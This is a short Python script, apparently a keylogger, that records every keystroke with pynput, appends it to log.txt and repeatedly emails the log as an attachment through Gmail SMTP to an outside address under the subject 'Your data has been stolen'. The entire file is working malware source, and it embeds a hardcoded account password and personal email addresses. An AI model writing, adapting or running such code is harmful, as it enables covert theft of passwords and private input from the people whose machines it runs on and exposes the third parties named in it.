from pynput.keyboard import Key, Listener

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

count = 0
keys = []

def send_email():
	fromaddr = "segurancateste2@gmail.com"
	toaddr = "paula.mribeiro05@gmail.com"
	msg = MIMEMultipart() 
	msg['From'] = fromaddr 
	msg['To'] = toaddr 
	msg['Subject'] = "Your data has been stolen"
	body = "Here's your data"

	msg.attach(MIMEText(body, 'plain')) 
  
	filename = "log.txt"
	attachment = open(filename, "rb") 
  
	p = MIMEBase('application', 'octet-stream') 
	p.set_payload((attachment).read()) 
	encoders.encode_base64(p) 
   
	p.add_header('Content-Disposition', "attachment; filename= %s" % filename) 
	msg.attach(p) 
  
	s = smtplib.SMTP('smtp.gmail.com', 587) 
	s.starttls() 

	s.login(fromaddr, "1d2c3b4a") 
  
	text = msg.as_string() 
  
	s.sendmail(fromaddr, toaddr, text) 

	s.quit() 

def on_press(key):
	global keys, count

	keys.append(key)
	count += 1

	if count > 10:
		write_file(keys)
		count = 0
		keys = []

def write_file(keys):
	with open("log.txt", "a") as f:
		for key in keys:
			k = str(key).replace("'", "")
			if k.find('space') > 0:
				f.write(' ')
			elif k.find("Key") == -1:
				f.write(k)

	send_email()

def on_release(key):
	if key == Key.esc:
		return False

with Listener(on_press=on_press, on_release=on_release) as listener:
	listener.join()
